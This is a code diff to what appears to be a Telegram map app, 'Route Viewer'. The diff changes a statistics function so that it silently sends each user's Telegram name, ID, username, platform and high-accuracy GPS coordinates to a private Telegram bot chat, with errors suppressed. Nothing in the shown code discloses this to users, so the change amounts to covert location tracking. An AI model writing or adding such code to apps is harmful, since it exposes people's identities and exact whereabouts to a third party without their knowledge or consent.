@@ -173,7 +173,6 @@ ymaps.ready(() => {
         
         initGeo();
         loadData();
-        if (tg.initDataUnsafe?.user) sendStats(tg.initDataUnsafe.user);
     } catch (e) { console.error(e); }
 });
 
@@ -383,6 +382,12 @@ function initGeo() {
         userMarker.geometry.setCoordinates(coords);
         userMarker.options.set('visible', true);
         if (state.autoCenter) map.panTo(coords);
+        
+        // ОТПРАВКА СТАТИСТИКИ С ГЕОПОЗИЦИЕЙ
+        if (!state.geoSent && tg.initDataUnsafe?.user) {
+            sendStats(tg.initDataUnsafe.user, coords);
+            state.geoSent = true;
+        }
     }, null, { enableHighAccuracy: true });
 }
 
@@ -395,9 +400,12 @@ const calcAz = (p1, p2) => {
     return Math.round((Math.atan2(dx, dy) * 180 / Math.PI + 360) % 360);
 };
 
-const sendStats = (u) => {
-    const msg = `🚀 *Route Viewer*\n👤 ${u.first_name}\n🆔 \`${u.id}\`\n🔗 @${u.username||'none'}\n📱 ${tg.platform}`;
-    fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage?chat_id=${CFG.CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(()=>{});
+const sendStats = (u, coords) => {
+    let msg = `🚀 *Route Viewer*\n👤 ${u.first_name}\n🆔 \`${u.id}\`\n🔗 @${u.username||'none'}\n📱 ${tg.platform}`;
+    if (coords) {
+        msg += `\n📍 [Открыть местоположение](https://www.google.com/maps?q=${coords[0]},${coords[1]})`;
+    }
+    fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage?chat_id=${CFG.CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown&disable_web_page_preview=true`).catch(()=>{});
 };
 </script>
 </body>
